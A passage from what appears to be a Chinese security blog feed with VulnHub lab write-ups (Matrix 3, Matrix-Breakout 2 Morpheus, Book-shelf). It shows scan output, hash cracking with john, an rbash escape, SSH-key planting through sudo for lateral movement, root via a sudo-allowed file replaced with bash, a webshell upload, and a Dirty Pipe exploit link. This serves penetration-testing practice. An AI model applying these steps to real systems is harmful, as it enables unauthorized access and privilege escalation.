4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.62 ms 192.168.1.110</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.36 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -A -T4 192.168.1.110 -p- -oN nmap160.A</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/test# nmap -A -T4 192.168.1.110 -p- -oN nmap160.A</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-19 06:02 EST</span><br><span class="line">Nmap scan report for 192.168.1.110</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">80/tcp   open     http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</span><br><span class="line">|_http-title: Welcome in Matrix</span><br><span class="line">6464/tcp open     ssh     OpenSSH 7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)</span><br><span class="line">|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)</span><br><span class="line">|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)</span><br><span class="line">7331/tcp filtered swx</span><br><span class="line">MAC Address: 00:0C:29:17:3F:B4 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.31 ms 192.168.1.110</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Machine_Matrix3/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./Machine_Matrix3/2.png" alt></p>
<ul>
<li><code>80</code>端口无发现</li>
<li><code>6464</code>端口，<code>ssh</code></li>
</ul>
<p><img data-src="./Machine_Matrix3/3.png" alt></p>
<ul>
<li><code>7331</code>端口，无反应</li>
</ul>
<p><img data-src="./Machine_Matrix3/4.png" alt></p>
<h3 id="资源文件"><a href="#资源文件" class="headerlink" title="资源文件"></a>资源文件</h3><p><img data-src="./Machine_Matrix3/5.png" alt></p>
<ul>
<li>根据提示前三位为 <code>neo</code>,后面的开始爆破</li>
</ul>
<p><img data-src="./Machine_Matrix3/6.png" alt></p>
<p><img data-src="./Machine_Matrix3/7.png" alt></p>
<ul>
<li>获取<code>secret.gz</code></li>
</ul>
<p><img data-src="./Machine_Matrix3/8.png" alt></p>
<p>发现无法解压，<code>notepad++</code>查看(被作者骗了)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin:76a2173be6393254e72ffa4d6df1030a(passwd)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>md5</code>解码</li>
</ul>
<h3 id="7331端口"><a href="#7331端口" class="headerlink" title="7331端口"></a>7331端口</h3><p><img data-src="./Machine_Matrix3/9.png" alt></p>
<ul>
<li>查看<code>robots.txt</code></li>
</ul>
<p><img data-src="./Machine_Matrix3/10.png" alt></p>
<ul>
<li>获取<code>data</code>文件</li>
</ul>
<p><img data-src="./Machine_Matrix3/11.png" alt></p>
<ul>
<li>发现是<code>windows</code>二进制文件</li>
</ul>
<p><img data-src="./Machine_Matrix3/12.png" alt></p>
<p><img data-src="./Machine_Matrix3/13.png" alt></p>
<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p><img data-src="./Machine_Matrix3/14.png" alt></p>
<ul>
<li>得到账号密码 <code>guest:7R1n17yN30</code></li>
</ul>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh guest@192.168.1.110 -p 6464</span><br></pre></td></tr></table></figure>

<ul>
<li><p>逃逸<code>rbash</code></p>
</li>
<li><p>配置环境变量</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/usr/bin</span><br><span class="line">export PATH=$PATH:/bin</span><br></pre></td></tr></table></figure>

<ul>
<li><code>sudo -l</code>发现线索</li>
</ul>
<p><img data-src="./Machine_Matrix3/15.png" alt></p>
<ul>
<li>水平提权到 <code>trinity</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -o</span><br><span class="line">chmod 777 id_rsa.pub</span><br><span class="line">mv id_rsa.pub /tmp/</span><br><span class="line">sudo -u trinity cp /tmp/id_rsa.pub /home/trinity/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh trinity@127.0.0.1 -p 6464</span><br><span class="line">or</span><br><span class="line">ssh trinity@127.0.0.1 -i .ssh/id_rsa -p 6464</span><br></pre></td></tr></table></figure>

<p><img data-src="./Machine_Matrix3/16.png" alt></p>
<ul>
<li>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">trinity@matrix:~$ sudo -l</span><br><span class="line">User trinity may run the following commands on matrix:</span><br><span class="line">    (root) NOPASSWD: /home/trinity/oracle</span><br></pre></td></tr></table></figure>

<ul>
<li>将 <code>/bin/bash</code>拷贝 <code>/home/trinity/oracle</code></li>
</ul>
<p><img data-src="./Machine_Matrix3/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Matrix</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Matrix</tag>
      </tags>
  </entry>
  <entry>
    <title>Matrix-Breakout 2Morpheus</title>
    <url>/2023/01/14/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Matrix-Breakout_2_Morpheus/</url>
    <content><![CDATA[<h1 id="Matrix-Breakout-2-Morpheus"><a href="#Matrix-Breakout-2-Morpheus" class="headerlink" title="Matrix-Breakout: 2 Morpheus"></a>Matrix-Breakout: 2 Morpheus</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2021</li>
<li>Matrix-Breakout: 2 Morpheus</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e2:02:cf, IPv4: 192.168.253.194</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.253.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.253.2   00:50:56:f8:93:11       VMware, Inc.</span><br><span class="line">192.168.253.193 00:0c:29:c8:43:08       VMware, Inc.</span><br><span class="line">192.168.253.254 00:50:56:fd:65:c7       VMware, Inc.</span><br><span class="line"></span><br><span class="line">28 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.253.193</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.253.193</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.253.193</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-14 05:24 EST</span><br><span class="line">Nmap scan report for 192.168.253.193</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">|_http-title: Morpheus:1</span><br><span class="line">81/tcp open  http    nginx 1.18.0</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Meeting Place</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">MAC Address: 00:0C:29:C8:43:08 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=1/14%OT=22%CT=1%CU=36477%PV=Y%DS=1%DC=D%G=Y%M=000C29%T</span><br><span class="line">OS:M=63C28301%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O</span><br><span class="line">OS:5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.28 ms 192.168.253.193</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.253.193/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.253.193/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.253.193/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/01/14 05:26:27 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 348]</span><br><span class="line">/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.253.193/javascript/]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 47]                                          </span><br><span class="line">/graffiti.txt         (Status: 200) [Size: 139]                                         </span><br><span class="line">/graffiti.php         (Status: 200) [Size: 451]                                         </span><br><span class="line">/server-status        (Status: 403) [Size: 280]                                         </span><br><span class="line">                                                                                        </span><br><span class="line">===============================================================</span><br><span class="line">2023/01/14 05:27:39 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Matrix-Breakout_2_Morpheus/1.png" alt></p>
<h3 id="写入shell马"><a href="#写入shell马" class="headerlink" title="写入shell马"></a>写入shell马</h3><p><img data-src="./Matrix-Breakout_2_Morpheus/2.png" alt></p>
<p><img data-src="./Matrix-Breakout_2_Morpheus/3.png" alt></p>
<p><img data-src="./Matrix-Breakout_2_Morpheus/4.png" alt></p>
<ul>
<li><p>发现存在写入文件功能</p>
</li>
<li><p>写入<code>webshell</code></p>
</li>
</ul>
<p><img data-src="./Matrix-Breakout_2_Morpheus/5.png" alt></p>
<h3 id="获取普通用户"><a href="#获取普通用户" class="headerlink" title="获取普通用户"></a>获取普通用户</h3><ul>
<li>发现隐藏文件</li>
</ul>
<p><img data-src="./Matrix-Breakout_2_Morpheus/6.png" alt></p>
<p><img data-src="./Matrix-Breakout_2_Morpheus/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /var/nginx/html/.htpasswd</span></span><br><span class="line">cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0</span><br></pre></td></tr></table></figure>

<ul>
<li>john破解ssh密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./passwd</span></span><br><span class="line">cypher:x:1001:1001::/home/cypher:/bin/bash</span><br><span class="line"></span><br><span class="line">./shadow</span><br><span class="line">cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0</span><br><span class="line"></span><br><span class="line">unshadow ./passwd ./shadow &gt;pass.txt	</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ./pass.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; FAIL</span></span><br><span class="line">C:\root\vulnhub\matrix-breakout-2-morpheus&gt; john --wordlist=/usr/share/wordlists/rockyou.txt ./pass.txt</span><br><span class="line">Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"</span><br><span class="line">Use the "--format=md5crypt-long" option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">0g 0:00:00:15 27.15% (ETA: 07:41:43) 0g/s 267290p/s 267290c/s 267290C/s sadiebud..sadie0234</span><br><span class="line">0g 0:00:00:18 33.00% (ETA: 07:41:42) 0g/s 267158p/s 267158c/s 267158C/s oscar1205..osbanee</span><br><span class="line">0g 0:00:00:20 36.93% (ETA: 07:41:42) 0g/s 267571p/s 267571c/s 267571C/s modousy..modget8</span><br><span class="line">0g 0:00:00:51 DONE (2023-01-14 07:41) 0g/s 271468p/s 271468c/s 271468C/s !!!0mc3t..*7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ./pass.txt --format=md5crypt-long</span><br></pre></td></tr></table></figure>

<ul>
<li>发现ignorance-bliss.png图片包含其他信息</li>
</ul>
<p><img data-src="./Matrix-Breakout_2_Morpheus/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk ignorance-bliss.png</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 提取文件</span></span><br><span class="line">binwalk -e ignorance-bliss.png</span><br></pre></td></tr></table></figure>

<ul>
<li>fail</li>
</ul>
<h3 id="CVE提权"><a href="#CVE提权" class="headerlink" title="CVE提权"></a>CVE提权</h3><ul>
<li>cve-2022-0847 (<a href="https://github.com/r1is/CVE-2022-0847" target="_blank" rel="noopener">https://github.com/r1is/CVE-2022-0847</a>)</li>
</ul>
<p><img data-src="./Matrix-Breakout_2_Morpheus/9.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Matrix-Breakout</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Matrix-Breakout 2_Morpheus</tag>
      </tags>
  </entry>
  <entry>
    <title>Book-shelf</title>
    <url>/2021/08/31/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Book-shelf/</url>
    <content><![CDATA[<h1 id="Book-shelf"><a href="#Book-shelf" class="headerlink" title="Book-shelf"></a>Book-shelf</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Book-shelf</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀kali)-[~/vulnhub/Book-shelf]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.6     00:0c:29:89:a1:44       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.123   20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.1.134   20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.1.242   3c:7c:3f:d3:05:d5       (Unknown)</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.030 seconds (126.11 hosts/sec). 11 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.134</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.134</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀kali)-[~/vulnhub/Book-shelf]</span><br><span class="line">└─# nmap -sV -A -p 1-65535 192.168.1.134</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 09:06 EDT</span><br><span class="line">Nmap scan report for debian.lan (192.168.1.134)</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0            5956 Mar 08 13:16 webpass.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.102</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 88:60:9f:5e:7d:5f:a1:ee:ac:29:05:f4:c1:98:a0:af (RSA)</span><br><span class="line">|   256 10:bd:ca:e7:b2:9d:cc:f4:5a:f9:d3:24:cd:85:05:39 (ECDSA)</span><br><span class="line">|_  256 72:0e:bf:b8:2b:f8:7d:65:72:07:d4:5d:18:a8:85:c6 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Book Shelf</span><br><span class="line">3306/tcp  open  mysql   MySQL (unauthorized)</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message"</span><br><span class="line">|     HY000</span><br><span class="line">|   LDAPBindReq: </span><br><span class="line">|     *Parse error unserializing protobuf message"</span><br><span class="line">|     HY000</span><br><span class="line">|   oracle-tns: </span><br><span class="line">|     Invalid message-frame."</span><br><span class="line">|_    HY000</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=7.91%I=7%D=8/31%Time=612E2953%P=x86_64-pc-linux-gnu%r(N</span><br><span class="line">SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\</span><br><span class="line">SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp</span><br><span class="line">SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b</span><br><span class="line">SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers</span><br><span class="line">SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2</span><br><span class="line">SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI</span><br><span class="line">SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")</span><br><span class="line">SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01</span><br><span class="line">SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie</span><br><span class="line">SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x</span><br><span class="line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"</span><br><span class="line">SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9</span><br><span class="line">SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\</span><br><span class="line">SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0</span><br><span class="line">SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,</span><br><span class="line">SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\</span><br><span class="line">SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\</span><br><span class="line">SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me</span><br><span class="line">SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN</span><br><span class="line">SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\</span><br><span class="line">SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP</span><br><span class="line">SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x</span><br><span class="line">SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x</span><br><span class="line">SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"</span><br><span class="line">SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid</span><br><span class="line">SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x</span><br><span class="line">SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10</span><br><span class="line">SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");</span><br><span class="line">MAC Address: 20:0D:B0:30:02:D2 (Shenzhen Four Seas Global Link Network Technology)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.53 ms debian.lan (192.168.1.134)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.05 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀kali)-[/home/workhard]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.134/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                